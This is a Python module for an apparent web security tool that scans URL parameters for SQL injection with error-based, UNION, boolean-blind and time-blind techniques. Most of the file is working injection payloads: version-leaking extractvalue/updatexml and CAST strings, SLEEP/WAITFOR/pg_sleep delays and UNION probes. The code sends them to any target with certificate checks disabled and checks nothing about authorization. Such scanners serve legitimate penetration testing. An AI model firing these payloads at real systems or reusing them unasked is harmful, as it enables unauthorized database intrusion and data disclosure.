import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

SLEEP_SECONDS = 5
MARKER = "prth0s9173"

ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysqli?", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that (corresponds|fits) to your (MySQL|MariaDB)",
        r"Unknown column '[^ ]+' in 'field list'", r"MySqlClient\.", r"com\.mysql\.jdbc",
        r"You have an error in your SQL syntax", r"mysql_fetch", r"mysql_num_rows",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near", r"unterminated quoted string at or near",
    ],
    "MSSQL": [
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"\bSQL Server[^&]+Driver",
        r"Warning.*mssql_", r"\[Microsoft\]\[ODBC SQL Server Driver\]",
        r"System\.Data\.SqlClient\.SqlException", r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near", r"microsoft ole db provider for sql server",
    ],
    "Oracle": [
        r"\bORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_",
        r"quoted string not properly terminated", r"SQL command not properly ended",
        r"oracle\.jdbc", r"OracleException",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"\[SQLITE_ERROR\]", r"sqlite3\.OperationalError",
        r"unrecognized token:", r"SQL logic error",
    ],
    "Generic": [
        r"SQL syntax error", r"syntax error.*SQL", r"unexpected end of SQL command",
        r"Dynamic SQL Error", r"java\.sql\.SQLException", r"Unclosed quotation",
    ],
}

ERROR_PAYLOADS: list[str] = [
    "'", "\"", "`", "')", "\")", "`)", "';", "\";", "'--", "\"--", "'#",
    "' AND '1'='2", "' AND 1=2--", "\\", "%27", "%22", "'||'", "' OR '1'='1' AND '1'='2",
    "1'", "1\"", "1`", "1')", "1\")", "1' AND '1", "0'XOR(1)XOR'Z",
    "'+'", "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND 1=CONVERT(int,(SELECT @@version))--",
    "1 AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=cast((SELECT version()) as int)--", "'||(SELECT 1 FROM dual WHERE 1=1)||'",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(0))--", "%bf%27", "%ef%bc%87",
    "1));", "1)));", "');--", "\");--", "if(1=1,1,(select 1 union select 2))",
    "' RLIKE SLEEP(0)--", "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    "AND 1=1", "AND 1=2", "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
    "1' ORDER BY 9999--", "\" ORDER BY 9999--", "'))) OR 1=1--",
]

BOOLEAN_PAYLOADS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 1=1#", "' AND 1=2#"),
    (") AND 1=1--", ") AND 1=2--"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("' AND 2>1--", "' AND 2<1--"),
    ("' AND 'a'='a", "' AND 'a'='b"),
    ("\") AND (\"1\"=\"1", "\") AND (\"1\"=\"2"),
    ("' AND SUBSTRING(version(),1,1)>'0'--", "' AND SUBSTRING(version(),1,1)>'z'--"),
    ("1=1", "1=2"),
]

TIME_PAYLOADS: list[str] = [
    f"' AND SLEEP({SLEEP_SECONDS})--",
    f"' AND SLEEP({SLEEP_SECONDS})#",
    f"' OR SLEEP({SLEEP_SECONDS})--",
    f"\" AND SLEEP({SLEEP_SECONDS})--",
    f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_SECONDS})))a)--",
    f"' AND SLEEP({SLEEP_SECONDS}) AND '1'='1",
    f"1 AND SLEEP({SLEEP_SECONDS})",
    f"1) AND SLEEP({SLEEP_SECONDS})--",
    f"') AND SLEEP({SLEEP_SECONDS})--",
    f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
    f"'); WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
    f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
    f"' WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
    f"' AND pg_sleep({SLEEP_SECONDS})--",
    f"' OR pg_sleep({SLEEP_SECONDS})--",
    f"'||pg_sleep({SLEEP_SECONDS})--",
    f"' AND (SELECT {SLEEP_SECONDS} FROM PG_SLEEP({SLEEP_SECONDS}))--",
    f"' AND DBMS_LOCK.SLEEP({SLEEP_SECONDS})--",
    f"' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3)--",
    f"' RLIKE SLEEP({SLEEP_SECONDS})--",
    f"' AND BENCHMARK(3000000,SHA1(1))--",
    f"'+BENCHMARK(3000000,SHA1(1))+'",
]

UNION_PAYLOADS: list[str] = [
    f"' UNION SELECT '{MARKER}'--",
    f"' UNION SELECT NULL,'{MARKER}'--",
    f"' UNION SELECT NULL,NULL,'{MARKER}'--",
    f"' UNION SELECT '{MARKER}',NULL,NULL--",
    f"' UNION ALL SELECT '{MARKER}'--",
    f"-1' UNION SELECT '{MARKER}'--",
    f"-1' UNION SELECT NULL,'{MARKER}'--",
    f"1' UNION SELECT '{MARKER}'#",
    f"' UNION SELECT concat('{MARKER}',version())--",
    f"-1 UNION SELECT '{MARKER}'",
    f"-1 UNION SELECT NULL,'{MARKER}'",
    f"-1 UNION SELECT '{MARKER}',NULL,NULL,NULL",
    f"') UNION SELECT '{MARKER}'--",
    f"' UNION SELECT '{MARKER}' FROM dual--",
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class SQLiFinding:
    url:        str
    param:      str
    technique:  str
    dbms:       str
    payload:    str
    status:     int          = 0
    delay:      float        = 0.0
    evidence:   str          = ""
    severity:   str          = "critical"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class SQLiReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    params:      list[str]           = field(default_factory=list)
    total:       int                 = 0
    findings:    list[SQLiFinding]   = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[SQLiFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _match_error(body: str) -> Optional[tuple[str, str]]:
    for dbms, patterns in ERROR_PATTERNS.items():
        for pat in patterns:
            m = re.search(pat, body, re.IGNORECASE)
            if m:
                return dbms, m.group(0)[:120]
    return None


def _similarity(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    la, lb = len(a), len(b)
    if max(la, lb) == 0:
        return 1.0
    return 1.0 - abs(la - lb) / max(la, lb)


@dataclass
class _Baseline:
    status: int
    body:   str
    length: int
    elapsed: float
    has_error: bool


async def _baseline(client: httpx.AsyncClient, url: str, param: str) -> _Baseline:
    try:
        t0 = time.perf_counter()
        r = await client.get(_set_param(url, param, "1"), timeout=15)
        elapsed = time.perf_counter() - t0
        return _Baseline(r.status_code, r.text[:20000], len(r.text), elapsed,
                         _match_error(r.text) is not None)
    except Exception:
        return _Baseline(0, "", 0, 0.0, False)


async def _test_error(client, url, param, base, sem) -> list[SQLiFinding]:
    findings = []
    async with sem:
        for payload in ERROR_PAYLOADS:
            try:
                r = await client.get(_set_param(url, param, payload), timeout=15)
            except Exception:
                continue
            if base.has_error:
                continue
            hit = _match_error(r.text)
            if hit:
                dbms, evidence = hit
                f = SQLiFinding(url=url, param=param, technique="error-based",
                                dbms=dbms, payload=payload, status=r.status_code,
                                evidence=evidence, severity="critical")
                findings.append(f)
                _print_finding(f)
                return findings
    return findings


async def _test_boolean(client, url, param, base, sem) -> list[SQLiFinding]:
    findings = []
    if base.status == 0:
        return findings
    async with sem:
        for true_p, false_p in BOOLEAN_PAYLOADS:
            try:
                rt = await client.get(_set_param(url, param, true_p), timeout=15)
                rf = await client.get(_set_param(url, param, false_p), timeout=15)
            except Exception:
                continue
            sim_true  = _similarity(base.body, rt.text[:20000])
            sim_false = _similarity(base.body, rf.text[:20000])
            sim_tf    = _similarity(rt.text[:20000], rf.text[:20000])
            if rt.status_code == base.status and sim_true > 0.95 and sim_false < 0.9 and sim_tf < 0.9:
                f = SQLiFinding(url=url, param=param, technique="boolean-blind",
                                dbms="unknown", payload=f"{true_p} / {false_p}",
                                status=rt.status_code,
                                evidence=f"true~base ({sim_true:.2f}), false diff ({sim_false:.2f})",
                                severity="critical")
                findings.append(f)
                _print_finding(f)
                return findings
    return findings


async def _test_time(client, url, param, base, sem) -> list[SQLiFinding]:
    findings = []
    threshold = SLEEP_SECONDS * 0.8
    async with sem:
        for payload in TIME_PAYLOADS:
            try:
                t0 = time.perf_counter()
                r  = await client.get(_set_param(url, param, payload), timeout=SLEEP_SECONDS * 3)
                elapsed = time.perf_counter() - t0
            except Exception:
                continue
            if elapsed >= threshold and base.elapsed < threshold:
                try:
                    t1 = time.perf_counter()
                    await client.get(_set_param(url, param, payload), timeout=SLEEP_SECONDS * 3)
                    confirm = time.perf_counter() - t1
                except Exception:
                    confirm = 0.0
                if confirm >= threshold:
                    f = SQLiFinding(url=url, param=param, technique="time-blind",
                                    dbms="unknown", payload=payload, status=r.status_code,
                                    delay=round(elapsed, 2),
                                    evidence=f"delay {elapsed:.1f}s/{confirm:.1f}s vs base {base.elapsed:.1f}s",
                                    severity="critical")
                    findings.append(f)
                    _print_finding(f)
                    return findings
    return findings


async def _test_union(client, url, param, base, sem) -> list[SQLiFinding]:
    findings = []
    async with sem:
        for payload in UNION_PAYLOADS:
            try:
                r = await client.get(_set_param(url, param, payload), timeout=15)
            except Exception:
                continue
            if MARKER in r.text and MARKER not in base.body:
                f = SQLiFinding(url=url, param=param, technique="union-based",
                                dbms="unknown", payload=payload, status=r.status_code,
                                evidence=f"marker '{MARKER}' reflected in response",
                                severity="critical")
                findings.append(f)
                _print_finding(f)
                return findings
    return findings


async def _scan_param(client, url, param, sem) -> list[SQLiFinding]:
    base = await _baseline(client, url, param)
    findings = []
    for tester in (_test_error, _test_union, _test_boolean, _test_time):
        result = await tester(client, url, param, base, sem)
        if result:
            findings.extend(result)
            break
    return findings


def _candidate_params(url: str, extra: Optional[list[str]]) -> list[str]:
    params = list(parse_qs(urlparse(url).query).keys())
    if extra:
        for p in extra:
            if p not in params:
                params.append(p)
    if not params:
        params = ["id"]
    return params


def _print_finding(f: SQLiFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    extra = f" delay={f.delay}s" if f.delay else ""
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.technique}[/yellow] [cyan]{f.dbms}[/cyan]"
        f"[dim]{extra}  payload: {f.payload[:45]}[/dim]"
    )


def _display(report: SQLiReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]requests:[/dim] {report.total}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]",
        title="[bold red]SQL Injection — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No SQL injection found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=16)
    table.add_column("Technique", style="cyan", width=15)
    table.add_column("DBMS",      style="magenta", width=12)
    table.add_column("Evidence",  style="yellow", min_width=30)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param, f.technique, f.dbms, f.evidence[:50],
        )

    console.print(table)
    console.print()


async def _sqli_async(target, extra_params, concurrency, proxy) -> SQLiReport:
    report = SQLiReport(target=target)
    params = _candidate_params(target, extra_params)
    report.params = params
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Scanning SQLi...", total=len(params))
            tasks = [_scan_param(client, target, p, sem) for p in params]
            for coro in asyncio.as_completed(tasks):
                report.findings.extend(await coro)
                progress.advance(task_id, 1)

    report.total = len(params) * (
        len(ERROR_PAYLOADS) + len(UNION_PAYLOADS)
        + len(BOOLEAN_PAYLOADS) * 2 + len(TIME_PAYLOADS))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_sqli_scan(
    target:        str,
    params:        Optional[list[str]] = None,
    concurrency:   int                 = 8,
    proxy:         Optional[str]       = None,
    save_json:     Optional[str]       = None,
) -> SQLiReport:

    console.print(f"\n[bold red][*][/bold red] SQL Injection → [bold white]{target}[/bold white]")
    detected = _candidate_params(target, params)
    console.print(f"[dim]    Params: {', '.join(detected)}  "
                  f"Techniques: error, union, boolean, time[/dim]")

    report = asyncio.run(_sqli_async(
        target=target,
        extra_params=params,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
